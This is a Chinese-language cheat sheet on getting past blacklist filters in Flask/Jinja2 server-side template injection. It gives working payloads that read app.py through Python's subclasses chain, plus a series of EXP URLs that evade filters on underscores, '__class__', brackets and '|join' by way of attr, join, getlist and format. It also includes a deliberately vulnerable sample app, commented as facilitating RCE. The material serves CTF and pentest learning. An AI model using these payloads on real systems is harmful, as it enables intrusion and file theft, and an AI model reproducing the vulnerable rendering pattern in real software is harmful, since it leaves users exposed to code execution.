# Flask Bypass 进阶

这里总结一些过滤和绕过的手法。  

### Sheet 1

### 绕过  _  .  '这三个

有一种写法，在模板注入时可以使用，但正常的python语法是不支持的。  

在模板注入过程中，下面两种写法是等价的。

```python
{{"".__class__}}
{{""["\x5f\x5fclass\x5f\x5f"]}}
```

> "\x5f"是字符 ”_“，”\x2E"是字符 "."。

那么，读取文件可以这样写（_frozen_importlib_external.FileLoader'的get_data()方法，第一个是参数0，第二个文件名）

```python
{{""["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "app\x2Epy")}}
#也就是
{{"".__class__.__bases__[0].__subclasses__()[91].get_data(0,"app.py")}}
```

## Sheet 2

[论文链接](https://0day.work/jinja2-template-injection-filter-bypasses/)  

简单的Flask程序示例：  

```python
import os #We need that to facilitate the RCE. Otherwise one needs to run {{config.from_object("os")}} first.
from flask import Flask, render_template, render_template_string, request
app = Flask(__name__)
@app.route("/")

def index():
    exploit = request.args.get('exploit')
    rendered_template = render_template("app.html", exploit=exploit)
    print(rendered_template)
    return render_template_string(rendered_template)
if __name__ == "__main__":
    app.run(debug=True)
```

对应的模板：  

```python
{# $>cat templates/app.html #} 
{{exploit}} 
```

### a.绕过 '__'

过滤举例

```python
exploit = request.args.get('exploit')
    print exploit

    blacklist = ["_"]
    for bad_string in blacklist:
        if  bad_string in exploit:
            return "HACK ATTEMPT {}".format(bad_string), 400
```

除了`request.__class__`，还可以用request.["_\_class_\_"]这种写法，即数组+字典下标的方式。但是仅使用这个方法是不行的，因为在render的时候就已经进行了对引号的转义，并且黑名单中的字符仍然存在。  

注意到request变量可以访问所有我们提交上去的变量，可以使用`request.args.<param>`的语法，再传入一个\<param\>来构造变量。  

这样就获得了一个绕过的方法：

+ EXP:`/?exploit={{request[request.args.pa]}}&pa=**class**`

### b.绕过'request[request.'

```python
blacklist = ["__","request[request."]
```

Jinja有类似Linux管道机制的语法，即'|'符号。  

利用此语法加上attr()方法，就可以达到在方括号中书写属性名称一样的效果。  

`request | attr(request.args.a)`等价于`request["a"]`    

+ EXP:`/?exploit={{request|attr(request.args.pa)}}&pa=**class**`

### c.绕过'_\_class_\_'

```python
blacklist = ["__","request[request.","__class__"]
```

使用管道+join方法，可以进行字符串的拼接操作。  

`["a","b","c"]|join`等价于`abc`。  

+ EXP:`/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_`

这段的执行步骤是：

1. 带入变量`{{request|attr(["_"*2,"class","_"*2]|join)}}`

2. 调用join方法`{{request|attr("_\_class_\_")}}`

3. 调用attr方法`{{request._\_class_\_}}`

### d.绕过'[' 和 ']'

```python
blacklist = ["__","request[request.","__class__",'[',']']
```

可以使用元组`('a','b','c')`的方式给`join`传递参数，这样既可绕过方括号。只要把上一个EXP的方括号替换成圆括号即可，不过还有一个更优雅的方案。  

使用 `.getlist()`方法得到一个列表，这个列表的参数可以在后面传递，具体示例请看EXP  

EXP:`/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_`

### e.绕过"|join"

```python
blacklist = ["__","request[request.","__class__",'[',']',"|join"]
```

使用管道+format方法，用格式化字符串生成被过滤的字串。  

EXP:`/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_`  

这里f作为格式化字符串，其中的`%s`被`a='_'`替换。  
